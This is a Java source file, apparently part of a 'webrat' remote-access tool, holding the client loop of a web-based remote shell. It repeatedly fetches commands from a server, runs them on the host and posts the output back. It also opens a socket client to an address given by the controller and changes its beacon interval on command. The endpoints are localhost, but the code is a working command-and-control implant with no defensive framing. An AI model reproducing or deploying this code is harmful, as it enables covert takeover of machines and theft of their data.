package com.renks.webrat;

public class Example {
	private static String fileURL = "http://localhost:8291/WebServer%20based%20shell%20using%20JAVA/command_to_execute.txt";
	private static String ServerURL = "http://localhost:8291/WebServer%20based%20shell%20using%20JAVA/output_write_to_file.php";
	private static final RemoteShell rs = new RemoteShell(fileURL, ServerURL);
	// Command to be executed, made this variable so we don't have to again and
	// again call rs.getCommand()
	private static String currentCmd;

	// Sleep time
	private static int sleepTime = 10000; // 10 seconds

	public static void main(String[] args) throws InterruptedException {

		rs.setCurrentDir("E:/");

		while (true) {
			// Connect to web server
			rs.fetchCommand();

			currentCmd = rs.getCommand();
			// Very Sensitive
			if (currentCmd.startsWith("--COMMAND-START-CLIENT-SOCKET")) {

				String[] serverAddr = currentCmd.split("\\s+");

				// Telling the web server that we started socket connection
				rs.setArguments("msg", "Socket Client started @" + serverAddr[1] + ":" + serverAddr[2]);
				rs.sendOutputToServer();

				try {
					RSSocketClient client = new RSSocketClient(serverAddr[1], Integer.parseInt(serverAddr[2]));
				} catch (Exception e) {
					rs.setArguments("msg", "Could not start Client @" + serverAddr[1] + ":" + serverAddr[2]
							+ ". Reason: " + e.getMessage());
					rs.sendOutputToServer();
					// continue; Don't use this
				}

			} else if (currentCmd.startsWith("--COMMAND-SLEEP-FOR")) {
				// Will crash the program if provided value could not be converted to int,
				// For eg: 60000*2 <- this value is string and can not be converted to int by
				// parseInt()
				sleepTime = Integer.parseInt(currentCmd.split("\\s+")[1]);
				System.out.println("Current sleepTime set to: " + sleepTime);
			} else {
				System.out.println("ELSE Block:");
				Thread executionThread = new Thread(() -> executeNsend());
				executionThread.start();
			}

			System.out.println("Main Thread: Sleeping for " + sleepTime + " milliseconds.");

			if (sleepTime > 60000) {
				rs.setArguments("msg", "Main Thread: Sleeping for " + sleepTime + " milliseconds.");
				rs.sendOutputToServer();
			}

			Thread.sleep(sleepTime);
		}

	}

	private static void executeNsend() {
		rs.executeCommand();
		rs.setArguments("msg", rs.getCommandOutput());
		// Problems may occur in this method
		rs.sendOutputToServer();
		System.out.println("executed and sent.");
		// executionThread.stop();
	}

}
